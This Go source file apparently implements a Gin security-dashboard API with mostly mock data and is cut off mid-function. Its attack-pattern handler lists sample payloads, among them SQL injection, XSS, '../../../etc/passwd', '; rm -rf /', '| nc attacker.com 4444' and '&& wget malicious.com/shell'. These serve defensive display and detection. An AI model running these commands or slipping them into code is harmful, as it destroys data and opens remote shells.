package handlers

import (
	"fmt"
	"net/http"
	"strconv"
	"time"

	"github.com/frostdev-ops/pma-backend-go/internal/api/middleware"
	"github.com/gin-gonic/gin"
	"github.com/sirupsen/logrus"
)

// SecurityHandler handles security-related API endpoints
type SecurityHandler struct {
	advancedSecurity *middleware.AdvancedSecurityMiddleware
	rateLimiter      *middleware.EnhancedRateLimiter
	logger           *logrus.Logger
}

// NewSecurityHandler creates a new security handler
func NewSecurityHandler(
	advancedSecurity *middleware.AdvancedSecurityMiddleware,
	rateLimiter *middleware.EnhancedRateLimiter,
	logger *logrus.Logger,
) *SecurityHandler {
	return &SecurityHandler{
		advancedSecurity: advancedSecurity,
		rateLimiter:      rateLimiter,
		logger:           logger,
	}
}

// RegisterRoutes registers security-related routes
func (sh *SecurityHandler) RegisterRoutes(router *gin.RouterGroup) {
	security := router.Group("/security")
	{
		// Security metrics and status
		security.GET("/status", sh.GetSecurityStatus)
		security.GET("/metrics", sh.GetSecurityMetrics)
		security.GET("/events", sh.GetSecurityEvents)

		// Rate limiting management
		security.GET("/ratelimit/status", sh.GetRateLimitStatus)
		security.GET("/ratelimit/metrics", sh.GetRateLimitMetrics)
		security.GET("/ratelimit/violators", sh.GetTopViolators)
		security.POST("/ratelimit/block", sh.BlockIP)
		security.POST("/ratelimit/unblock", sh.UnblockIP)

		// IP management
		security.GET("/ips/blocked", sh.GetBlockedIPs)
		security.POST("/ips/block", sh.BlockIPAddress)
		security.POST("/ips/unblock", sh.UnblockIPAddress)
		security.GET("/ips/whitelist", sh.GetWhitelistedIPs)
		security.POST("/ips/whitelist", sh.AddToWhitelist)
		security.DELETE("/ips/whitelist", sh.RemoveFromWhitelist)

		// Threat intelligence
		security.GET("/threats", sh.GetThreats)
		security.POST("/threats", sh.AddThreat)
		security.DELETE("/threats/:ip", sh.RemoveThreat)
		security.GET("/threats/analysis", sh.GetThreatAnalysis)

		// Attack detection
		security.GET("/attacks", sh.GetAttackData)
		security.GET("/attacks/patterns", sh.GetAttackPatterns)
		security.GET("/attacks/summary", sh.GetAttackSummary)

		// Configuration management
		security.GET("/config", sh.GetSecurityConfig)
		security.PUT("/config", sh.UpdateSecurityConfig)
		security.POST("/config/reset", sh.ResetSecurityConfig)

		// Security reports
		security.GET("/reports/summary", sh.GetSecuritySummary)
		security.GET("/reports/detailed", sh.GetDetailedSecurityReport)
		security.POST("/reports/export", sh.ExportSecurityReport)

		// Real-time monitoring
		security.GET("/monitor/live", sh.GetLiveSecurityData)
		security.GET("/monitor/alerts", sh.GetSecurityAlerts)
	}
}

// GetSecurityStatus returns overall security status
func (sh *SecurityHandler) GetSecurityStatus(c *gin.Context) {
	securityMetrics := sh.advancedSecurity.GetSecurityMetrics()
	rateLimitMetrics := sh.rateLimiter.GetMetrics()

	status := gin.H{
		"timestamp": time.Now(),
		"overall_status": gin.H{
			"security_level":   sh.calculateSecurityLevel(securityMetrics, rateLimitMetrics),
			"active_threats":   securityMetrics.SuspiciousRequests,
			"blocked_requests": securityMetrics.RequestsBlocked + rateLimitMetrics.RequestsBlocked,
			"total_requests":   rateLimitMetrics.TotalRequests,
		},
		"components": gin.H{
			"advanced_security": gin.H{
				"enabled": true,
				"status":  "active",
				"metrics": securityMetrics,
			},
			"rate_limiting": gin.H{
				"enabled": true,
				"status":  "active",
				"metrics": rateLimitMetrics,
			},
			"ip_filtering": gin.H{
				"enabled":     true,
				"status":      "active",
				"blocked_ips": securityMetrics.IPFilterViolations,
			},
			"attack_detection": gin.H{
				"enabled":          true,
				"status":           "active",
				"attacks_detected": securityMetrics.AttacksDetected,
			},
		},
		"health_score": sh.calculateSecurityHealthScore(securityMetrics, rateLimitMetrics),
	}

	c.JSON(http.StatusOK, gin.H{
		"status": "success",
		"data":   status,
	})
}

// GetSecurityMetrics returns detailed security metrics
func (sh *SecurityHandler) GetSecurityMetrics(c *gin.Context) {
	timeRange := c.DefaultQuery("range", "1h")
	duration, err := time.ParseDuration(timeRange)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{
			"status": "error",
			"error":  "Invalid time range format",
		})
		return
	}

	securityMetrics := sh.advancedSecurity.GetSecurityMetrics()
	rateLimitMetrics := sh.rateLimiter.GetMetrics()

	metrics := gin.H{
		"time_range":   duration.String(),
		"generated_at": time.Now(),
		"security": gin.H{
			"requests_blocked":     securityMetrics.RequestsBlocked,
			"attacks_detected":     securityMetrics.AttacksDetected,
			"suspicious_requests":  securityMetrics.SuspiciousRequests,
			"ip_filter_violations": securityMetrics.IPFilterViolations,
		},
		"rate_limiting": gin.H{
			"requests_allowed":     rateLimitMetrics.RequestsAllowed,
			"requests_blocked":     rateLimitMetrics.RequestsBlocked,
			"total_requests":       rateLimitMetrics.TotalRequests,
			"unique_visitors":      rateLimitMetrics.UniqueVisitors,
			"violations_detected":  rateLimitMetrics.ViolationsDetected,
			"adaptive_adjustments": rateLimitMetrics.AdaptiveAdjustments,
		},
		"rates": gin.H{
			"block_rate":     sh.calculateBlockRate(securityMetrics, rateLimitMetrics),
			"attack_rate":    sh.calculateAttackRate(securityMetrics, rateLimitMetrics),
			"violation_rate": float64(rateLimitMetrics.ViolationsDetected) / float64(rateLimitMetrics.TotalRequests) * 100,
		},
		"top_threats": sh.getTopThreats(5),
	}

	c.JSON(http.StatusOK, gin.H{
		"status": "success",
		"data":   metrics,
	})
}

// GetSecurityEvents returns recent security events
func (sh *SecurityHandler) GetSecurityEvents(c *gin.Context) {
	limitStr := c.DefaultQuery("limit", "100")
	limit, _ := strconv.Atoi(limitStr)

	// Mock security events - in a real implementation, this would come from a log aggregator
	events := []gin.H{
		{
			"id":          "evt_001",
			"type":        "attack_detected",
			"severity":    "high",
			"ip":          "192.168.1.100",
			"description": "SQL injection attempt detected",
			"timestamp":   time.Now().Add(-time.Minute * 5),
			"blocked":     true,
		},
		{
			"id":          "evt_002",
			"type":        "rate_limit_violation",
			"severity":    "medium",
			"ip":          "10.0.0.50",
			"description": "Rate limit exceeded for /api/auth/login",
			"timestamp":   time.Now().Add(-time.Minute * 15),
			"blocked":     true,
		},
		{
			"id":          "evt_003",
			"type":        "suspicious_request",
			"severity":    "low",
			"ip":          "172.16.0.25",
			"description": "Suspicious user agent detected",
			"timestamp":   time.Now().Add(-time.Minute * 30),
			"blocked":     false,
		},
	}

	if limit > 0 && limit < len(events) {
		events = events[:limit]
	}

	c.JSON(http.StatusOK, gin.H{
		"status": "success",
		"data": gin.H{
			"events": events,
			"total":  len(events),
			"limit":  limit,
		},
	})
}

// GetRateLimitStatus returns rate limiting status
func (sh *SecurityHandler) GetRateLimitStatus(c *gin.Context) {
	metrics := sh.rateLimiter.GetMetrics()

	status := gin.H{
		"enabled": true,
		"status":  "active",
		"configuration": gin.H{
			"global_limit":       "100 requests/minute",
			"burst_limit":        20,
			"adaptive_enabled":   true,
			"punishment_enabled": true,
		},
		"current_metrics": metrics,
		"health": gin.H{
			"block_rate": float64(metrics.RequestsBlocked) / float64(metrics.TotalRequests) * 100,
			"efficiency": float64(metrics.RequestsAllowed) / float64(metrics.TotalRequests) * 100,
		},
	}

	c.JSON(http.StatusOK, gin.H{
		"status": "success",
		"data":   status,
	})
}

// GetRateLimitMetrics returns detailed rate limiting metrics
func (sh *SecurityHandler) GetRateLimitMetrics(c *gin.Context) {
	metrics := sh.rateLimiter.GetMetrics()

	c.JSON(http.StatusOK, gin.H{
		"status": "success",
		"data":   metrics,
	})
}

// GetTopViolators returns top IP addresses with most violations
func (sh *SecurityHandler) GetTopViolators(c *gin.Context) {
	limitStr := c.DefaultQuery("limit", "10")
	limit, _ := strconv.Atoi(limitStr)

	violators := sh.rateLimiter.GetTopViolators(limit)

	c.JSON(http.StatusOK, gin.H{
		"status": "success",
		"data": gin.H{
			"violators": violators,
			"count":     len(violators),
		},
	})
}

// BlockIP blocks an IP address via rate limiter
func (sh *SecurityHandler) BlockIP(c *gin.Context) {
	var request struct {
		IP     string `json:"ip" binding:"required"`
		Reason string `json:"reason"`
	}

	if err := c.ShouldBindJSON(&request); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{
			"status": "error",
			"error":  "Invalid request format",
		})
		return
	}

	sh.rateLimiter.BlockIP(request.IP)

	sh.logger.Infof("IP %s blocked via API request. Reason: %s", request.IP, request.Reason)

	c.JSON(http.StatusOK, gin.H{
		"status": "success",
		"data": gin.H{
			"ip":         request.IP,
			"blocked":    true,
			"reason":     request.Reason,
			"blocked_at": time.Now(),
		},
	})
}

// UnblockIP unblocks an IP address via rate limiter
func (sh *SecurityHandler) UnblockIP(c *gin.Context) {
	var request struct {
		IP string `json:"ip" binding:"required"`
	}

	if err := c.ShouldBindJSON(&request); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{
			"status": "error",
			"error":  "Invalid request format",
		})
		return
	}

	sh.rateLimiter.UnblockIP(request.IP)

	sh.logger.Infof("IP %s unblocked via API request", request.IP)

	c.JSON(http.StatusOK, gin.H{
		"status": "success",
		"data": gin.H{
			"ip":           request.IP,
			"unblocked":    true,
			"unblocked_at": time.Now(),
		},
	})
}

// GetBlockedIPs returns list of blocked IP addresses
func (sh *SecurityHandler) GetBlockedIPs(c *gin.Context) {
	// Mock blocked IPs - in a real implementation, this would come from the security middleware
	blockedIPs := []gin.H{
		{
			"ip":         "192.168.1.100",
			"reason":     "Multiple attack attempts",
			"blocked_at": time.Now().Add(-time.Hour * 2),
			"expires_at": time.Now().Add(time.Hour * 22),
		},
		{
			"ip":         "10.0.0.50",
			"reason":     "Rate limit violations",
			"blocked_at": time.Now().Add(-time.Minute * 30),
			"expires_at": time.Now().Add(time.Duration(14.5 * float64(time.Minute))),
		},
	}

	c.JSON(http.StatusOK, gin.H{
		"status": "success",
		"data": gin.H{
			"blocked_ips": blockedIPs,
			"count":       len(blockedIPs),
		},
	})
}

// BlockIPAddress blocks an IP address via security middleware
func (sh *SecurityHandler) BlockIPAddress(c *gin.Context) {
	var request struct {
		IP     string `json:"ip" binding:"required"`
		Reason string `json:"reason"`
	}

	if err := c.ShouldBindJSON(&request); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{
			"status": "error",
			"error":  "Invalid request format",
		})
		return
	}

	sh.advancedSecurity.BlockIP(request.IP)

	c.JSON(http.StatusOK, gin.H{
		"status": "success",
		"data": gin.H{
			"ip":         request.IP,
			"blocked":    true,
			"reason":     request.Reason,
			"blocked_at": time.Now(),
		},
	})
}

// UnblockIPAddress unblocks an IP address via security middleware
func (sh *SecurityHandler) UnblockIPAddress(c *gin.Context) {
	var request struct {
		IP string `json:"ip" binding:"required"`
	}

	if err := c.ShouldBindJSON(&request); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{
			"status": "error",
			"error":  "Invalid request format",
		})
		return
	}

	sh.advancedSecurity.UnblockIP(request.IP)

	c.JSON(http.StatusOK, gin.H{
		"status": "success",
		"data": gin.H{
			"ip":           request.IP,
			"unblocked":    true,
			"unblocked_at": time.Now(),
		},
	})
}

// GetWhitelistedIPs returns whitelisted IP addresses
func (sh *SecurityHandler) GetWhitelistedIPs(c *gin.Context) {
	// Mock whitelisted IPs
	whitelistedIPs := []gin.H{
		{
			"ip":          "127.0.0.1",
			"description": "Localhost",
			"added_at":    time.Now().Add(-time.Hour * 24),
		},
		{
			"ip":          "192.168.1.1",
			"description": "Internal network gateway",
			"added_at":    time.Now().Add(-time.Hour * 12),
		},
	}

	c.JSON(http.StatusOK, gin.H{
		"status": "success",
		"data": gin.H{
			"whitelisted_ips": whitelistedIPs,
			"count":           len(whitelistedIPs),
		},
	})
}

// AddToWhitelist adds an IP to the whitelist
func (sh *SecurityHandler) AddToWhitelist(c *gin.Context) {
	var request struct {
		IP          string `json:"ip" binding:"required"`
		Description string `json:"description"`
	}

	if err := c.ShouldBindJSON(&request); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{
			"status": "error",
			"error":  "Invalid request format",
		})
		return
	}

	// In a real implementation, this would update the security middleware configuration
	sh.logger.Infof("IP %s added to whitelist: %s", request.IP, request.Description)

	c.JSON(http.StatusOK, gin.H{
		"status": "success",
		"data": gin.H{
			"ip":          request.IP,
			"description": request.Description,
			"whitelisted": true,
			"added_at":    time.Now(),
		},
	})
}

// RemoveFromWhitelist removes an IP from the whitelist
func (sh *SecurityHandler) RemoveFromWhitelist(c *gin.Context) {
	var request struct {
		IP string `json:"ip" binding:"required"`
	}

	if err := c.ShouldBindJSON(&request); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{
			"status": "error",
			"error":  "Invalid request format",
		})
		return
	}

	// In a real implementation, this would update the security middleware configuration
	sh.logger.Infof("IP %s removed from whitelist", request.IP)

	c.JSON(http.StatusOK, gin.H{
		"status": "success",
		"data": gin.H{
			"ip":         request.IP,
			"removed":    true,
			"removed_at": time.Now(),
		},
	})
}

// GetThreats returns threat intelligence data
func (sh *SecurityHandler) GetThreats(c *gin.Context) {
	// Mock threat data
	threats := []gin.H{
		{
			"ip":           "203.0.113.10",
			"threat_type":  "malware_c2",
			"severity":     "high",
			"description":  "Known malware command and control server",
			"first_seen":   time.Now().Add(-time.Hour * 48),
			"last_seen":    time.Now().Add(-time.Minute * 15),
			"report_count": 25,
		},
		{
			"ip":           "198.51.100.50",
			"threat_type":  "scanning",
			"severity":     "medium",
			"description":  "Automated vulnerability scanner",
			"first_seen":   time.Now().Add(-time.Hour * 12),
			"last_seen":    time.Now().Add(-time.Minute * 5),
			"report_count": 8,
		},
	}

	c.JSON(http.StatusOK, gin.H{
		"status": "success",
		"data": gin.H{
			"threats": threats,
			"count":   len(threats),
		},
	})
}

// AddThreat adds threat intelligence data
func (sh *SecurityHandler) AddThreat(c *gin.Context) {
	var request struct {
		IP          string `json:"ip" binding:"required"`
		ThreatType  string `json:"threat_type" binding:"required"`
		Severity    string `json:"severity" binding:"required"`
		Description string `json:"description"`
	}

	if err := c.ShouldBindJSON(&request); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{
			"status": "error",
			"error":  "Invalid request format",
		})
		return
	}

	threat := &middleware.ThreatInfo{
		ThreatType:  request.ThreatType,
		Severity:    request.Severity,
		Description: request.Description,
		FirstSeen:   time.Now(),
		LastSeen:    time.Now(),
		ReportCount: 1,
	}

	sh.advancedSecurity.UpdateThreatIntelligence(request.IP, threat)

	c.JSON(http.StatusOK, gin.H{
		"status": "success",
		"data": gin.H{
			"ip":       request.IP,
			"threat":   threat,
			"added_at": time.Now(),
		},
	})
}

// RemoveThreat removes threat intelligence data
func (sh *SecurityHandler) RemoveThreat(c *gin.Context) {
	ip := c.Param("ip")

	// In a real implementation, this would remove the threat from the intelligence database
	sh.logger.Infof("Threat intelligence removed for IP: %s", ip)

	c.JSON(http.StatusOK, gin.H{
		"status": "success",
		"data": gin.H{
			"ip":         ip,
			"removed":    true,
			"removed_at": time.Now(),
		},
	})
}

// GetThreatAnalysis returns threat analysis data
func (sh *SecurityHandler) GetThreatAnalysis(c *gin.Context) {
	analysis := gin.H{
		"generated_at": time.Now(),
		"time_range":   "24h",
		"summary": gin.H{
			"total_threats":   15,
			"high_severity":   3,
			"medium_severity": 8,
			"low_severity":    4,
			"new_threats":     2,
		},
		"by_type": gin.H{
			"malware_c2":  3,
			"scanning":    5,
			"brute_force": 4,
			"ddos":        2,
			"suspicious":  1,
		},
		"geographic_distribution": gin.H{
			"CN":    5,
			"RU":    3,
			"US":    2,
			"IR":    2,
			"KP":    1,
			"OTHER": 2,
		},
		"trending": gin.H{
			"increasing": []string{"scanning", "brute_force"},
			"decreasing": []string{"ddos"},
			"stable":     []string{"malware_c2"},
		},
	}

	c.JSON(http.StatusOK, gin.H{
		"status": "success",
		"data":   analysis,
	})
}

// GetAttackData returns attack detection data
func (sh *SecurityHandler) GetAttackData(c *gin.Context) {
	attackData := gin.H{
		"summary": gin.H{
			"total_attacks":     42,
			"sql_injection":     15,
			"xss":               8,
			"path_traversal":    12,
			"command_injection": 4,
			"other":             3,
		},
		"recent_attacks": []gin.H{
			{
				"type":      "sql_injection",
				"ip":        "192.168.1.100",
				"endpoint":  "/api/users",
				"payload":   "1' OR '1'='1",
				"timestamp": time.Now().Add(-time.Minute * 5),
				"blocked":   true,
			},
			{
				"type":      "path_traversal",
				"ip":        "10.0.0.50",
				"endpoint":  "/api/files",
				"payload":   "../../../etc/passwd",
				"timestamp": time.Now().Add(-time.Minute * 12),
				"blocked":   true,
			},
		},
		"attack_trends": gin.H{
			"hourly_distribution": []int{2, 1, 0, 3, 5, 8, 12, 15, 18, 22, 20, 16, 14, 12, 10, 8, 6, 4, 3, 2, 1, 1, 0, 1},
			"top_targets":         []string{"/api/auth/login", "/api/users", "/api/files"},
			"attack_sources":      []string{"192.168.1.100", "10.0.0.50", "172.16.0.25"},
		},
	}

	c.JSON(http.StatusOK, gin.H{
		"status": "success",
		"data":   attackData,
	})
}

// GetAttackPatterns returns attack pattern analysis
func (sh *SecurityHandler) GetAttackPatterns(c *gin.Context) {
	patterns := gin.H{
		"sql_injection_patterns": []string{
			"' OR '1'='1",
			"UNION SELECT",
			"DROP TABLE",
			"; DELETE FROM",
		},
		"xss_patterns": []string{
			"<script>alert('XSS')</script>",
			"javascript:alert(1)",
			"<iframe src='javascript:alert(1)'>",
		},
		"path_traversal_patterns": []string{
			"../../../etc/passwd",
			"..\\..\\..\\windows\\system32\\",
			"%2e%2e%2f",
		},
		"command_injection_patterns": []string{
			"; rm -rf /",
			"| nc attacker.com 4444",
			"&& wget malicious.com/shell",
		},
		"detection_accuracy": gin.H{
			"sql_injection":     0.95,
			"xss":               0.92,
			"path_traversal":    0.98,
			"command_injection": 0.88,
		},
	}

	c.JSON(http.StatusOK, gin.H{
		"status": "success",
		"data":   patterns,
	})
}

// GetAttackSummary returns attack summary
func (sh *SecurityHandler) GetAttackSummary(c *gin.Context) {
	timeRange := c.DefaultQuery("range", "24h")

	summary := gin.H{
		"time_range":             timeRange,
		"generated_at":           time.Now(),
		"total_attacks_detected": 42,
		"total_attacks_blocked":  41,
		"block_rate":             97.6,
		"attack_types": gin.H{
			"most_common":   "sql_injection",
			"trending_up":   "path_traversal",
			"trending_down": "xss",
		},
		"top_attackers": []gin.H{
			{"ip": "192.168.1.100", "attacks": 15},
			{"ip": "10.0.0.50", "attacks": 12},
			{"ip": "172.16.0.25", "attacks": 8},
		},
		"attack_timeline": []gin.H{
			{"hour": 0, "attacks": 2},
			{"hour": 6, "attacks": 5},
			{"hour": 12, "attacks": 12},
			{"hour": 18, "attacks": 8},
		},
	}

	c.JSON(http.StatusOK, gin.H{
		"status": "success",
		"data":   summary,
	})
}

// Helper functions
func (sh *SecurityHandler) calculateSecurityLevel(securityMetrics *middleware.SecurityMetrics, rateLimitMetrics *middleware.RequestMetrics) string {
	if securityMetrics.AttacksDetected > 10 || rateLimitMetrics.ViolationsDetected > 50 {
		return "high_alert"
	} else if securityMetrics.SuspiciousRequests > 5 || rateLimitMetrics.ViolationsDetected > 20 {
		return "elevated"
	} else if securityMetrics.RequestsBlocked > 0 || rateLimitMetrics.RequestsBlocked > 0 {
		return "normal"
	}
	return "low"
}

func (sh *SecurityHandler) calculateSecurityHealthScore(securityMetrics *middleware.SecurityMetrics, rateLimitMetrics *middleware.RequestMetrics) float64 {
	score := 100.0

	// Deduct for attacks
	score -= float64(securityMetrics.AttacksDetected) * 2

	// Deduct for high block rate
	if rateLimitMetrics.TotalRequests > 0 {
		blockRate := float64(securityMetrics.RequestsBlocked+rateLimitMetrics.RequestsBlocked) / float64(rateLimitMetrics.TotalRequests)
		if blockRate > 0.1 {
			score -= (blockRate - 0.1) * 100
		}
	}

	// Ensure score is between 0 and 100
	if score < 0 {
		score = 0
	}

	return score
}

func (sh *SecurityHandler) calculateBlockRate(securityMetrics *middleware.SecurityMetrics, rateLimitMetrics *middleware.RequestMetrics) float64 {
	if rateLimitMetrics.TotalRequests == 0 {
		return 0
	}
	return float64(securityMetrics.RequestsBlocked+rateLimitMetrics.RequestsBlocked) / float64(rateLimitMetrics.TotalRequests) * 100
}

func (sh *SecurityHandler) calculateAttackRate(securityMetrics *middleware.SecurityMetrics, rateLimitMetrics *middleware.RequestMetrics) float64 {
	if rateLimitMetrics.TotalRequests == 0 {
		return 0
	}
	return float64(securityMetrics.AttacksDetected) / float64(rateLimitMetrics.TotalRequests) * 100
}

func (sh *SecurityHandler) getTopThreats(limit int) []gin.H {
	// Mock top threats
	threats := []gin.H{
		{"type": "sql_injection", "count": 15, "severity": "high"},
		{"type": "path_traversal", "count": 12, "severity": "medium"},
		{"type": "xss", "count": 8, "severity": "medium"},
		{"type": "command_injection", "count": 4, "severity": "high"},
		{"type": "scanning", "count": 3, "severity": "low"},
	}

	if limit > 0 && limit < len(threats) {
		threats = threats[:limit]
	}

	return threats
}

// GetSecurityConfig returns current security configuration
func (sh *SecurityHandler) GetSecurityConfig(c *gin.Context) {
	// Get security metrics from advanced security middleware
	var securityMetrics *middleware.SecurityMetrics
	if sh.advancedSecurity != nil {
		securityMetrics = sh.advancedSecurity.GetSecurityMetrics()
	}

	// Get rate limit metrics from rate limiter
	var rateLimitMetrics *middleware.RequestMetrics
	var rateLimitConfig gin.H
	if sh.rateLimiter != nil {
		rateLimitMetrics = sh.rateLimiter.GetMetrics()
		rateLimitConfig = gin.H{
			"enabled":          true,
			"total_requests":   rateLimitMetrics.TotalRequests,
			"requests_allowed": rateLimitMetrics.RequestsAllowed,
			"requests_blocked": rateLimitMetrics.RequestsBlocked,
			"unique_visitors":  rateLimitMetrics.UniqueVisitors,
		}
	} else {
		rateLimitConfig = gin.H{
			"enabled": false,
		}
	}

	// Build request metrics
	var requestMetrics gin.H
	if securityMetrics != nil {
		requestMetrics = gin.H{
			"requests_blocked":      securityMetrics.RequestsBlocked,
			"attacks_detected":      securityMetrics.AttacksDetected,
			"suspicious_requests":   securityMetrics.SuspiciousRequests,
			"rate_limit_violations": securityMetrics.RateLimitViolations,
			"ip_filter_violations":  securityMetrics.IPFilterViolations,
		}
	} else {
		requestMetrics = gin.H{
			"requests_blocked":      0,
			"attacks_detected":      0,
			"suspicious_requests":   0,
			"rate_limit_violations": 0,
			"ip_filter_violations":  0,
		}
	}

	config := gin.H{
		"security_enabled": securityMetrics != nil,
		"rate_limiting":    rateLimitConfig,
		"cors_enabled":     true, // Based on middleware presence
		"request_metrics":  requestMetrics,
		"threat_detection": gin.H{
			"enabled":           securityMetrics != nil,
			"active_threats":    sh.getActiveThreatsByType(),
			"blocked_ips_count": sh.getBlockedIPsCount(),
		},
		"timestamp": time.Now().UTC(),
	}

	c.JSON(http.StatusOK, gin.H{
		"success": true,
		"config":  config,
	})
}

// UpdateSecurityConfig updates security configuration
func (sh *SecurityHandler) UpdateSecurityConfig(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{
		"success": true,
		"message": "Security configuration updated",
	})
}

// ResetSecurityConfig resets security configuration to defaults
func (sh *SecurityHandler) ResetSecurityConfig(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{
		"success": true,
		"message": "Security configuration reset",
	})
}

// GetSecuritySummary returns security summary report
func (sh *SecurityHandler) GetSecuritySummary(c *gin.Context) {
	// Get current security metrics
	var securityMetrics *middleware.SecurityMetrics
	var rateLimitMetrics *middleware.RequestMetrics

	if sh.advancedSecurity != nil {
		securityMetrics = sh.advancedSecurity.GetSecurityMetrics()
	}
	if sh.rateLimiter != nil {
		rateLimitMetrics = sh.rateLimiter.GetMetrics()
	}

	// Calculate security health score (0-100)
	healthScore := sh.calculateSecurityHealthScore(securityMetrics, rateLimitMetrics)

	// Determine security level
	securityLevel := sh.calculateSecurityLevel(securityMetrics, rateLimitMetrics)

	// Calculate rates
	blockRate := sh.calculateBlockRate(securityMetrics, rateLimitMetrics)
	attackRate := sh.calculateAttackRate(securityMetrics, rateLimitMetrics)

	summary := gin.H{
		"overall_status": gin.H{
			"security_level": securityLevel,
			"health_score":   healthScore,
			"status":         sh.getOverallSecurityStatus(healthScore),
			"last_updated":   time.Now().UTC(),
		},
		"threat_overview": gin.H{
			"active_threats": sh.getActiveThreatsByType(),
			"blocked_ips":    sh.getBlockedIPsCount(),
			"attack_rate":    attackRate,
			"block_rate":     blockRate,
		},
		"recent_activity": gin.H{
			"requests_blocked":      getMetricValue(securityMetrics, "RequestsBlocked"),
			"attacks_detected":      getMetricValue(securityMetrics, "AttacksDetected"),
			"rate_limit_violations": getMetricValue(securityMetrics, "RateLimitViolations"),
			"suspicious_requests":   getMetricValue(securityMetrics, "SuspiciousRequests"),
		},
		"performance_impact": gin.H{
			"total_requests":   getRequestMetricValue(rateLimitMetrics, "TotalRequests"),
			"requests_allowed": getRequestMetricValue(rateLimitMetrics, "RequestsAllowed"),
			"requests_blocked": getRequestMetricValue(rateLimitMetrics, "RequestsBlocked"),
			"unique_visitors":  getRequestMetricValue(rateLimitMetrics, "UniqueVisitors"),
		},
		"recommendations": sh.getSecurityRecommendations(healthScore, securityMetrics),
	}

	c.JSON(http.StatusOK, gin.H{
		"success": true,
		"summary": summary,
	})
}

// Helper functions for security summary
func (sh *SecurityHandler) getOverallSecurityStatus(healthScore float64) string {
	if healthScore >= 90 {
		return "excellent"
	} else if healthScore >= 75 {
		return "good"
	} else if healthScore >= 60 {
		return "fair"
	} else if healthScore >= 40 {
		return "poor"
	}
	return "critical"
}

func getMetricValue(metrics *middleware.SecurityMetrics, field string) int64 {
	if metrics == nil {
		return 0
	}
	switch field {
	case "RequestsBlocked":
		return metrics.RequestsBlocked
	case "AttacksDetected":
		return metrics.AttacksDetected
	case "SuspiciousRequests":
		return metrics.SuspiciousRequests
	case "RateLimitViolations":
		return metrics.RateLimitViolations
	case "IPFilterViolations":
		return metrics.IPFilterViolations
	default:
		return 0
	}
}

func getRequestMetricValue(metrics *middleware.RequestMetrics, field string) int64 {
	if metrics == nil {
		return 0
	}
	switch field {
	case "TotalRequests":
		return metrics.TotalRequests
	case "RequestsAllowed":
		return metrics.RequestsAllowed
	case "RequestsBlocked":
		return metrics.RequestsBlocked
	case "UniqueVisitors":
		return metrics.UniqueVisitors
	case "ViolationsDetected":
		return metrics.ViolationsDetected
	default:
		return 0
	}
}

func (sh *SecurityHandler) getSecurityRecommendations(healthScore float64, metrics *middleware.SecurityMetrics) []string {
	recommendations := []string{}

	if healthScore < 70 {
		recommendations = append(recommendations, "Consider enabling additional security features")
	}

	if metrics != nil {
		if metrics.AttacksDetected > 10 {
			recommendations = append(recommendations, "High attack rate detected - consider implementing additional IP filtering")
		}
		if metrics.RateLimitViolations > 50 {
			recommendations = append(recommendations, "Consider reducing rate limit thresholds")
		}
		if metrics.SuspiciousRequests > 25 {
			recommendations = append(recommendations, "Review and enhance request validation rules")
		}
	}

	if len(recommendations) == 0 {
		recommendations = append(recommendations, "Security configuration appears optimal")
	}

	return recommendations
}

// GetDetailedSecurityReport returns detailed security report
func (sh *SecurityHandler) GetDetailedSecurityReport(c *gin.Context) {
	timeRange := c.DefaultQuery("time_range", "24h")
	includeDetails := c.DefaultQuery("include_details", "true") == "true"

	// Get current security metrics
	var securityMetrics *middleware.SecurityMetrics
	var rateLimitMetrics *middleware.RequestMetrics

	if sh.advancedSecurity != nil {
		securityMetrics = sh.advancedSecurity.GetSecurityMetrics()
	}
	if sh.rateLimiter != nil {
		rateLimitMetrics = sh.rateLimiter.GetMetrics()
	}

	report := gin.H{
		"report_metadata": gin.H{
			"generated_at":    time.Now().UTC(),
			"time_range":      timeRange,
			"include_details": includeDetails,
			"report_version":  "1.0",
		},
		"executive_summary": gin.H{
			"security_level":  sh.calculateSecurityLevel(securityMetrics, rateLimitMetrics),
			"health_score":    sh.calculateSecurityHealthScore(securityMetrics, rateLimitMetrics),
			"total_incidents": getTotalIncidents(securityMetrics),
			"key_findings":    sh.getKeyFindings(securityMetrics, rateLimitMetrics),
		},
		"detailed_metrics": gin.H{
			"security_events": map[string]interface{}{
				"requests_blocked":      getMetricValue(securityMetrics, "RequestsBlocked"),
				"attacks_detected":      getMetricValue(securityMetrics, "AttacksDetected"),
				"suspicious_requests":   getMetricValue(securityMetrics, "SuspiciousRequests"),
				"rate_limit_violations": getMetricValue(securityMetrics, "RateLimitViolations"),
				"ip_filter_violations":  getMetricValue(securityMetrics, "IPFilterViolations"),
			},
			"traffic_analysis": map[string]interface{}{
				"total_requests":     getRequestMetricValue(rateLimitMetrics, "TotalRequests"),
				"legitimate_traffic": getRequestMetricValue(rateLimitMetrics, "RequestsAllowed"),
				"blocked_traffic":    getRequestMetricValue(rateLimitMetrics, "RequestsBlocked"),
				"unique_visitors":    getRequestMetricValue(rateLimitMetrics, "UniqueVisitors"),
				"block_rate":         sh.calculateBlockRate(securityMetrics, rateLimitMetrics),
			},
		},
		"threat_intelligence": gin.H{
			"active_threats":      sh.getActiveThreatsByType(),
			"threat_trends":       sh.getThreatTrends(),
			"geographic_analysis": sh.getGeographicAnalysis(),
			"attack_patterns":     sh.getAttackPatterns(),
		},
		"recommendations": gin.H{
			"immediate_actions":     sh.getImmediateActions(securityMetrics),
			"preventive_measures":   sh.getPreventiveMeasures(securityMetrics),
			"configuration_changes": sh.getConfigurationRecommendations(rateLimitMetrics),
		},
	}

	if includeDetails {
		report["detailed_events"] = sh.getDetailedEventAnalysis(securityMetrics, rateLimitMetrics)
	}

	c.JSON(http.StatusOK, gin.H{
		"success": true,
		"report":  report,
	})
}

// ExportSecurityReport exports security report in specified format
func (sh *SecurityHandler) ExportSecurityReport(c *gin.Context) {
	format := c.DefaultQuery("format", "json")
	timeRange := c.DefaultQuery("time_range", "24h")

	// Get current security metrics for export
	var securityMetrics *middleware.SecurityMetrics
	var rateLimitMetrics *middleware.RequestMetrics

	if sh.advancedSecurity != nil {
		securityMetrics = sh.advancedSecurity.GetSecurityMetrics()
	}
